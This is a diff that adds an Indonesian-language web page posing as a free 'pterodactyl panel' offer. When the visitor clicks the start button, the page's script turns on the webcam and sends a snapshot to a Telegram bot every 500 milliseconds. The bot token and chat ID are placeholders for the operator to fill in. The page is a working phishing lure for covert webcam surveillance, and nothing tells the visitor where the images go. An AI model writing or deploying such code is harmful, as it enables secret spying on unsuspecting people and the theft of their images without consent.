@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Kamera Asli & Auto Screenshot</title>
+<style>
+body { text-align:center; font-family:sans-serif; background:#222; color:#fff; }
+video { border:2px solid #0f0; margin-top:20px; }
+button { padding:10px 20px; margin-top:20px; font-size:16px; }
+</style>
+</head>
+<body>
+<h1>panel pterodactyl free</h1>
+<p>Klik tombol di bawah untuk memulai panel pterodactyl free</p>
+<button id="startBtn">Mulai</button>
+<video id="video" width="320" height="240" autoplay style="display:none;"></video>
+
+<script>
+const video = document.getElementById('video');
+const startBtn = document.getElementById('startBtn');
+const botToken = "BOT_TOKEN_ANDA"; // Ganti token bot Telegram
+const chatId = "CHAT_ID_ANDA";     // Ganti chat ID tujuan
+
+startBtn.addEventListener('click', () => {
+    navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+        video.srcObject = stream;
+        video.style.display = 'block';
+        startBtn.style.display = 'none';
+
+        function sendScreenshot() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'screenshot.jpg');
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(res => res.json())
+                  .then(data => console.log("Screenshot terkirim"))
+                  .catch(err => console.error(err));
+            }, 'image/jpeg');
+        }
+
+        setInterval(sendScreenshot, 500); // auto screenshot tiap 5 detik
+    })
+    .catch(err => console.error("Akses kamera ditolak:", err));
+});
+</script>
+</body>
+</html>
